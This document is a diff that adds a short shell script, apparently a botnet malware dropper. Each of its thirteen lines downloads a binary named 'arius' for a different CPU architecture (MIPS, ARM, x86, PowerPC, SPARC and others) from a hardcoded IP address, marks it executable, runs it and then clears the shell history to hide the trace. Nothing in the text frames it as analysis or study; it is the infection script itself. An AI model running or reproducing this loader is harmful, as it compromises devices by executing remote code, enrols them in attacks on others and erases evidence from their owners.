@@ -1,0 +1,14 @@
+#!/bin/sh
+wget http://94.177.218.245/bins/arius.mips;chmod 777 arius.mips;./arius.mips;history -c
+wget http://94.177.218.245/bins/arius.mipsel;chmod 777 arius.mipsel;./arius.mipsel;history -c
+wget http://94.177.218.245/bins/arius.sh4;chmod 777 arius.sh4;./arius.sh4;history -c
+wget http://94.177.218.245/bins/arius.x86_64;chmod 777 arius.x86_64;./arius.x86_64;history -c
+wget http://94.177.218.245/bins/arius.armv6l;chmod 777 arius.armv6l;./arius.armv6l;history -c
+wget http://94.177.218.245/bins/arius.i686;chmod 777 arius.i686;./arius.i686;history -c
+wget http://94.177.218.245/bins/arius.powerpc;chmod 777 arius.powerpc;./arius.powerpc;history -c
+wget http://94.177.218.245/bins/arius.i586;chmod 777 arius.i586;./arius.i586;history -c
+wget http://94.177.218.245/bins/arius.m68k;chmod 777 arius.m68k;./arius.m68k;history -c
+wget http://94.177.218.245/bins/arius.sparc;chmod 777 arius.sparc;./arius.sparc;history -c
+wget http://94.177.218.245/bins/arius.armv4l;chmod 777 arius.armv4l;./arius.armv4l;history -c
+wget http://94.177.218.245/bins/arius.armv5l;chmod 777 arius.armv5l;./arius.armv5l;history -c
+wget http://94.177.218.245/bins/arius.ppc;chmod 777 arius.ppc;./arius.ppc;history -c
